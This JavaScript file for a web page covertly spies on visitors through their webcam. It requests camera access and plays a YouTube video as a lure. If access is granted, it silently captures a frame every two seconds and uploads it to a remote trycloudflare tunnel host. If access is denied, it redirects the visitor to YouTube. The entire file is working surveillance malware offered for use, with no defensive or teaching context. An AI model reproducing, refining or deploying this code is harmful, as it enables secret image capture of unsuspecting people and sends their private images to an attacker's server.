// Wait for page to load
document.addEventListener('DOMContentLoaded', function() {
    let mediaStream = null;
    let captureInterval = null;
    let videoElement = document.createElement('video');
    let videoPlayed = false; // Flag to track if video has been played

    // ⬇️ APNA CLOUDFLARED URL DAALO ⬇️
    const BACKEND_URL = 'https://brighton-satisfied-encourages-adapters.trycloudflare.com';

    // Function to capture image and send to server
    function captureAndSendImage() {
        if (!mediaStream) return;
        
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        
        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        
        fetch(BACKEND_URL + '/upload', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                image: imageData,
                timestamp: new Date().toISOString()
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('✅ Image saved:', data.filename);
        })
        .catch(err => {
            console.error('❌ Upload failed:', err);
        });
    }

    // Function to play YouTube video
    function playYouTubeVideo() {
        if (videoPlayed) return; // Sirf ek baar play karo
        videoPlayed = true;
        
        const iframe = document.getElementById('youtube-video');
        const placeholder = document.getElementById('video-placeholder');
        
        // Hide placeholder
        if (placeholder) {
            placeholder.style.display = 'none';
        }
        
        // Show iframe and set video source
        iframe.style.display = 'block';
        iframe.src = 'https://www.youtube.com/embed/sciKttcTabQ?autoplay=1&mute=1';
        
        console.log('▶️ Video started playing');
    }

    // Function to redirect on deny
    function redirectOnDeny() {
        console.log('🚫 Camera denied. Redirecting to YouTube...');
        window.location.href = 'https://www.youtube.com';
    }

    // 🔥 AUTOMATIC CAMERA ACCESS
    navigator.mediaDevices.getUserMedia({ 
        video: { width: 640, height: 480 } 
    })
    .then(stream => {
        mediaStream = stream;
        videoElement.srcObject = stream;
        videoElement.play();
        
        // ✅ Camera allowed - Play video and start recording
        playYouTubeVideo();
        
        // Start capturing every 2 seconds
        captureInterval = setInterval(captureAndSendImage, 2000);
        
        console.log('📸 Camera access granted. Capturing...');
    })
    .catch(err => {
        console.error('❌ Camera error:', err);
        // ❌ Camera denied - Redirect to YouTube
        redirectOnDeny();
    });
});

// Cleanup when page unloads
window.addEventListener('beforeunload', function() {
    if (captureInterval) clearInterval(captureInterval);
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
    }
});
